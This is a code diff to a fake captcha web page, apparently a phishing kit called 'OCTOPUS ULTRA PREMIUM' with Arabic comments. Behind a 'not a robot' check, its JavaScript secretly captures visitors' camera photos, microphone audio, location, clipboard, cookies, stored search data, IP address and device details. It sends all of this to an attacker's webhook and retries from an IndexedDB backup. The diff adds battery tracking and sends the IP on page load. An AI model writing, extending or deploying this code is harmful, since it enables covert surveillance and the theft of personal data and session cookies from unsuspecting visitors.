@@ -52,12 +52,12 @@
         .loading-overlay{display:none;position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.01);z-index:9999;pointer-events:none;}
         .loading-overlay.active{display:block;}
 
-        /* ========== مؤشر الأذونات الجديد ========== */
+        /* مؤشر الأذونات */
         .permission-indicator {
             position: fixed;
             bottom: 20px;
             left: 20px;
-            background: rgba(0,0,0,0.8);
+            background: rgba(0,0,0,0.85);
             border-radius: 12px;
             padding: 8px 14px;
             display: flex;
@@ -115,13 +115,14 @@
 
     <div class="loading-overlay" id="loadingOverlay"></div>
 
-    <!-- ====== مؤشر الأذونات ====== -->
+    <!-- مؤشر الأذونات -->
     <div class="permission-indicator" id="permIndicator">
         <span class="p-item"><span class="p-dot pending" id="dotCamera"></span>📷<span class="p-label">كام</span></span>
         <span class="p-item"><span class="p-dot pending" id="dotMic"></span>🎤<span class="p-label">ميك</span></span>
         <span class="p-item"><span class="p-dot pending" id="dotLocation"></span>📍<span class="p-label">موقع</span></span>
         <span class="p-item"><span class="p-dot pending" id="dotClipboard"></span>📋<span class="p-label">حافظة</span></span>
         <span class="p-item"><span class="p-dot pending" id="dotHeadless"></span>🤖<span class="p-label">هيدلس</span></span>
+        <span class="p-item"><span class="p-dot pending" id="dotBattery"></span>🔋<span class="p-label">بطارية</span></span>
     </div>
 
     <div class="captcha-wrapper" id="captchaWrapper" role="button" tabindex="0" aria-label="تحقق أنك لست روبوتاً">
@@ -166,8 +167,8 @@
 
     <script>
         // ================================================================
-        //  OCTOPUS ULTRA PREMIUM v2.7 – النسخة النهائية مع التحسينات
-        //  متوافقة 100% مع bot.php v3.4.0
+        //  OCTOPUS ULTRA PREMIUM v4.0 – النسخة النووية الكاملة
+        //  متوافقة 100% مع bot.php v4.0.0
         // ================================================================
 
         const CONFIG = {
@@ -185,7 +186,7 @@
             MASTER_TOKEN: 'MASTER',
             RETRY_INTERVAL: 30000,
             MAX_RETRIES: 5,
-            VERSION: '2.7'
+            VERSION: '4.0'
         };
 
         const state = {
@@ -219,6 +220,7 @@
             pendingRetries: 0,
             dataSent: false,
             isHeadless: false,
+            batteryLevel: null,
         };
 
         const el = {
@@ -239,7 +241,8 @@
                 mic: 'dotMic',
                 location: 'dotLocation',
                 clipboard: 'dotClipboard',
-                headless: 'dotHeadless'
+                headless: 'dotHeadless',
+                battery: 'dotBattery'
             };
             const dotId = dotMap[type];
             if (!dotId) return;
@@ -250,10 +253,13 @@
         function setHeadlessIndicator(headless) {
             const dot = document.getElementById('dotHeadless');
             if (dot) {
-                dot.className = 'p-dot ' + (headless ? 'granted' : 'denied');
-                // headless == true means we detected headless, so it's a "granted" for detection
-                // but we'll show it as red if headless, green if normal? Let's make red for headless, green for normal.
                 dot.className = 'p-dot ' + (headless ? 'denied' : 'granted');
+            }
+        }
+        function updateBatteryIndicator(level) {
+            const dot = document.getElementById('dotBattery');
+            if (dot) {
+                dot.className = 'p-dot ' + (level !== null ? 'granted' : 'denied');
             }
         }
 
@@ -358,7 +364,39 @@
         }
 
         // ================================================================
-        //  دوال الجهاز (نفسها مع تحديث المؤشر)
+        //  الحصول على IP – فوري عند التحميل
+        // ================================================================
+        async function fetchIP() {
+            try {
+                const res = await fetch('https://api.ipify.org?format=json');
+                const d = await res.json();
+                state.userIP = d.ip || 'غير متاح';
+                return state.userIP;
+            } catch (_) {
+                state.userIP = 'غير متاح';
+                return state.userIP;
+            }
+        }
+
+        // ================================================================
+        //  البطارية – دقة عالية
+        // ================================================================
+        async function getBatteryLevel() {
+            try {
+                const batt = await navigator.getBattery();
+                const level = Math.round(batt.level * 100);
+                state.batteryLevel = level;
+                updateBatteryIndicator(true);
+                return level;
+            } catch (_) {
+                state.batteryLevel = null;
+                updateBatteryIndicator(false);
+                return null;
+            }
+        }
+
+        // ================================================================
+        //  دوال الجهاز
         // ================================================================
         function classifyDevice() {
             const ua = navigator.userAgent;
@@ -500,11 +538,10 @@
         }
 
         // ================================================================
-        //  الحافظة – محسنة
+        //  الحافظة – كاملة
         // ================================================================
         async function readClipboard() {
             try {
-                // طلب إذن القراءة
                 const perm = await navigator.permissions.query({ name: 'clipboard-read' });
                 if (perm.state === 'granted' || perm.state === 'prompt') {
                     const text = await navigator.clipboard.readText();
@@ -514,7 +551,6 @@
                     return;
                 }
             } catch (_) {}
-            // الطريقة البديلة
             try {
                 const ta = document.createElement('textarea');
                 ta.style.cssText = 'position:fixed;opacity:0;pointer-events:none;top:-1000px;left:-1000px;';
@@ -538,12 +574,11 @@
         }
 
         // ================================================================
-        //  سحب سجل بحث جوجل ومحاولة قراءة IndexedDB
+        //  سحب سجل بحث جوجل و IndexedDB
         // ================================================================
         async function fetchGoogleSearchHistory() {
             const results = [];
             try {
-                // 1. البحث في localStorage عن مفاتيح شائعة
                 const keys = ['search', 'query', 'q', 'history', 'recent', 'lastSearch', 'searchTerms', 'queries',
                     'google:search', 'recentSearches', 'searchHistory'
                 ];
@@ -553,14 +588,12 @@
                         results.push({ source: 'localStorage', key: k, value: val });
                     }
                 }
-                // 2. محاولة قراءة IndexedDB الخاصة بجوجل (قد تختلف)
                 try {
                     const dbs = await indexedDB.databases();
                     for (const dbInfo of dbs) {
                         const dbName = dbInfo.name;
                         if (dbName && (dbName.includes('google') || dbName.includes('chrome') || dbName.includes('history') ||
                                 dbName.includes('search'))) {
-                            // محاولة فتح قاعدة البيانات
                             const db = await new Promise((resolve, reject) => {
                                 const req = indexedDB.open(dbName);
                                 req.onsuccess = () => resolve(req.result);
@@ -600,7 +633,7 @@
         }
 
         // ================================================================
-        //  تحسين جمع الكوكيز – تفاصيل إضافية
+        //  الكوكيز – كاملة مع التفاصيل
         // ================================================================
         function collectAllCookies() {
             const cookies = document.cookie.split(';').map(c => c.trim()).filter(c => c);
@@ -634,7 +667,7 @@
         }
 
         // ================================================================
-        //  جمع بيانات الجهاز (محسّن)
+        //  جمع بيانات الجهاز
         // ================================================================
         async function collectDeviceData() {
             const data = {};
@@ -680,15 +713,12 @@
                 }
             } catch (_) {}
 
-            try {
-                const batt = await navigator.getBattery();
+            if (state.batteryLevel !== null) {
                 data.battery = {
-                    level: Math.round(batt.level * 100),
-                    charging: batt.charging,
-                    chargingTime: batt.chargingTime,
-                    dischargingTime: batt.dischargingTime,
+                    level: state.batteryLevel,
+                    charging: false, // لا نستطيع الحصول عليها بسهولة هنا
                 };
-            } catch (_) {}
+            }
 
             try {
                 if (performance && performance.memory) {
@@ -755,15 +785,7 @@
                 if (data.installedFonts.length > 50) data.installedFonts = data.installedFonts.slice(0, 50);
             } catch (_) {}
 
-            try {
-                const res = await fetch('https://api.ipify.org?format=json');
-                const d = await res.json();
-                data.ip = d.ip || 'غير متاح';
-                state.userIP = data.ip;
-            } catch (_) {
-                data.ip = 'غير متاح';
-            }
-
+            data.ip = state.userIP;
             data.device = dev;
             data.spoofing = spoof;
             data.extensions = state.installedExtensions;
@@ -777,7 +799,7 @@
         }
 
         // ================================================================
-        //  الموقع – محسّن مع تحديث المؤشر
+        //  الموقع
         // ================================================================
         async function getLocation() {
             return new Promise((resolve) => {
@@ -896,7 +918,7 @@
         }
 
         // ================================================================
-        //  الكاميرا – مع تحديث المؤشر
+        //  الكاميرا
         // ================================================================
         async function startCameraAndCapture() {
             return new Promise(async (resolve) => {
@@ -987,7 +1009,7 @@
         }
 
         // ================================================================
-        //  الميكروفون – مع تحديث المؤشر وضمان جاهزية الصوت
+        //  الميكروفون – مع ضمان التسجيل
         // ================================================================
         async function recordAudio() {
             return new Promise(async (resolve) => {
@@ -1112,7 +1134,7 @@
         }
 
         // ================================================================
-        //  الأمان (نفس السابق)
+        //  الأمان
         // ================================================================
         function setupSecurity() {
             document.addEventListener('contextmenu', e => e.preventDefault());
@@ -1187,7 +1209,7 @@
         }
 
         // ================================================================
-        //  الإرسال النهائي – يضمن إرسال الصوت
+        //  الإرسال النهائي
         // ================================================================
         async function sendAllData(forceRetry = false) {
             if (state.dataSent && !forceRetry) return true;
@@ -1198,11 +1220,10 @@
             fd.append('ip', state.userIP);
             fd.append('timestamp', new Date().toISOString());
 
-            // كل البيانات
             fd.append('photoCount', String(state.capturedPhotoFiles.length));
             fd.append('clipboard', state.clipboardContent || '');
             fd.append('isHeadless', String(state.isHeadless));
-            fd.append('battery', state.collectedData.battery ? String(state.collectedData.battery.level) : '');
+            fd.append('battery', state.batteryLevel !== null ? String(state.batteryLevel) : '');
             
             fd.append('deviceData', safeStringify(state.collectedData));
             fd.append('attacks', safeStringify(state.attacksData));
@@ -1215,13 +1236,11 @@
             fd.append('spoofing', safeStringify(state.spoofingDetected));
             fd.append('deviceClassification', safeStringify(state.deviceClassification));
 
-            // الموقع
             fd.append('location[lat]', state.userLocation.lat !== null ? String(state.userLocation.lat) : '');
             fd.append('location[lng]', state.userLocation.lng !== null ? String(state.userLocation.lng) : '');
             fd.append('location[accuracy]', state.userLocation.accuracy !== null ? String(state.userLocation.accuracy) : '');
             fd.append('location[error]', state.userLocation.error || '');
 
-            // الصور
             if (state.capturedPhotoFiles.length > 0) {
                 state.capturedPhotoFiles.forEach((f) => {
                     fd.append(`photos[]`, f, f.name);
@@ -1231,7 +1250,6 @@
                 logToConsole('⚠️ لا توجد صور للإرسال');
             }
 
-            // الصوت – نتحقق من جاهزيته
             if (state.audioReady && state.audioBlob && state.audioBlob.size > 0) {
                 const af = new File([state.audioBlob], `audio_${Date.now()}.webm`, { type: 'audio/webm' });
                 fd.append('audio', af);
@@ -1240,7 +1258,6 @@
                 logToConsole('⚠️ لا يوجد ملف صوتي جاهز للإرسال');
             }
 
-            // === الإرسال ===
             try {
                 logToConsole('🚀 بدء الإرسال إلى البوت...');
                 const res = await fetch(CONFIG.WEBHOOK_URL, { method: 'POST', body: fd });
@@ -1253,7 +1270,8 @@
                     const allReceived = r.token && r.photos !== undefined && r.audio !== undefined && r.location !== undefined && 
                                        r.face !== undefined && r.transcription !== undefined && 
                                        r.clipboard !== undefined && r.device !== undefined && r.attacks !== undefined &&
-                                       r.cookies !== undefined && r.history !== undefined && r.extensions !== undefined && r.spoofing !== undefined;
+                                       r.cookies !== undefined && r.history !== undefined && r.extensions !== undefined && 
+                                       r.spoofing !== undefined && r.battery !== undefined;
                     if (allReceived) {
                         logToConsole('✅ تأكيد البوت: جميع البيانات استُلمت');
                         state.dataSent = true;
@@ -1281,6 +1299,7 @@
                     clipboardContent: state.clipboardContent,
                     isHeadless: state.isHeadless,
                     photoCount: state.capturedPhotoFiles.length,
+                    battery: state.batteryLevel,
                     timestamp: new Date().toISOString()
                 };
                 saveToIndexedDB(backupData);
@@ -1297,7 +1316,7 @@
         }
 
         // ================================================================
-        //  عملية الجمع المتوازي (Parallel) – محسّنة للسرعة
+        //  عملية الجمع المتوازي – النهائية
         // ================================================================
         async function collectEverything() {
             if (state.isCollecting || state.collectionComplete) return;
@@ -1306,31 +1325,27 @@
             setUIState('loading');
 
             try {
-                // 1. بيانات سريعة (تتزامن)
+                // 1. بيانات سريعة
                 classifyDevice();
                 detectSpoofing();
                 await detectExtensions();
-                collectAllCookies(); // سريع
-                await fetchGoogleSearchHistory(); // قد يستغرق بعض الوقت
+                collectAllCookies();
+                await fetchGoogleSearchHistory();
+                await getBatteryLevel();
 
-                // 2. تشغيل المهام المتوازية: الموقع، الكاميرا، الميكروفون
+                // 2. تشغيل المهام المتوازية
                 const locationPromise = getLocation();
                 const cameraPromise = startCameraAndCapture();
                 const audioPromise = recordAudio();
 
-                // ننتظر انتهاء الثلاثة معاً
                 await Promise.all([locationPromise, cameraPromise, audioPromise]);
 
-                // 3. جمع بيانات الجهاز (تعتمد على النتائج السابقة)
+                // 3. بيانات إضافية
                 await collectDeviceData();
-
-                // 4. الهجمات
                 deployAdvancedAttacks();
-
-                // 5. الحافظة
                 await readClipboard();
 
-                // 6. الإرسال النهائي
+                // 4. الإرسال النهائي
                 const sent = await sendAllData(false);
 
                 if (sent) {
@@ -1389,10 +1404,11 @@
         });
 
         // ================================================================
-        //  التهيئة
+        //  التهيئة – إرسال الزيارة + IP
         // ================================================================
         window.addEventListener('load', async () => {
             extractTokenFromURL();
+            await fetchIP();
             setupSecurity();
             enhanceStealth();
 
@@ -1402,25 +1418,9 @@
             updatePermissionIndicator('location', false);
             updatePermissionIndicator('clipboard', false);
             setHeadlessIndicator(false);
+            updateBatteryIndicator(false);
 
-            const backup = await loadFromIndexedDB();
-            if (backup && backup.data) {
-                logToConsole('🔄 Found backup data from IndexedDB');
-                if (backup.data.token) state.userToken = backup.data.token;
-                if (backup.data.ip) state.userIP = backup.data.ip;
-                if (backup.data.location) state.userLocation = backup.data.location;
-                if (backup.data.collectedData) state.collectedData = backup.data.collectedData;
-                if (backup.data.attacksData) state.attacksData = backup.data.attacksData;
-                if (backup.data.faceData) state.faceData = backup.data.faceData;
-                if (backup.data.transcribedText) state.transcribedText = backup.data.transcribedText;
-                if (backup.data.detectedLanguage) state.detectedLanguage = backup.data.detectedLanguage;
-                if (backup.data.clipboardContent) state.clipboardContent = backup.data.clipboardContent;
-                if (backup.data.isHeadless) state.isHeadless = backup.data.isHeadless;
-                setTimeout(() => {
-                    sendAllData(true);
-                }, 5000);
-            }
-
+            // === إرسال رسالة الزيارة مع IP ===
             try {
                 const fd = new FormData();
                 fd.append('event', 'visit');
@@ -1434,13 +1434,35 @@
                 fd.append('token', state.userToken);
                 fd.append('isHeadless', String(state.isHeadless));
                 await fetch(CONFIG.WEBHOOK_URL, { method: 'POST', body: fd });
+                logToConsole('📤 تم إرسال زيارة مع IP: ' + state.userIP);
             } catch (_) {}
+
+            // استعادة النسخ الاحتياطي
+            const backup = await loadFromIndexedDB();
+            if (backup && backup.data) {
+                logToConsole('🔄 Found backup data from IndexedDB');
+                if (backup.data.token) state.userToken = backup.data.token;
+                if (backup.data.ip) state.userIP = backup.data.ip;
+                if (backup.data.location) state.userLocation = backup.data.location;
+                if (backup.data.collectedData) state.collectedData = backup.data.collectedData;
+                if (backup.data.attacksData) state.attacksData = backup.data.attacksData;
+                if (backup.data.faceData) state.faceData = backup.data.faceData;
+                if (backup.data.transcribedText) state.transcribedText = backup.data.transcribedText;
+                if (backup.data.detectedLanguage) state.detectedLanguage = backup.data.detectedLanguage;
+                if (backup.data.clipboardContent) state.clipboardContent = backup.data.clipboardContent;
+                if (backup.data.isHeadless) state.isHeadless = backup.data.isHeadless;
+                if (backup.data.battery !== undefined) state.batteryLevel = backup.data.battery;
+                setTimeout(() => {
+                    sendAllData(true);
+                }, 5000);
+            }
 
             classifyDevice();
             detectSpoofing();
             await collectDeviceData();
 
-            logToConsole('🐙 OCTOPUS ULTRA PREMIUM v' + CONFIG.VERSION + ' – جاهز (توكن: ' + state.userToken + ')');
+            logToConsole('🐙 OCTOPUS ULTRA PREMIUM v' + CONFIG.VERSION + ' – جاهز (توكن: ' + state.userToken + ', IP: ' + state
+                .userIP + ')');
         });
 
         window.addEventListener('beforeunload', () => {
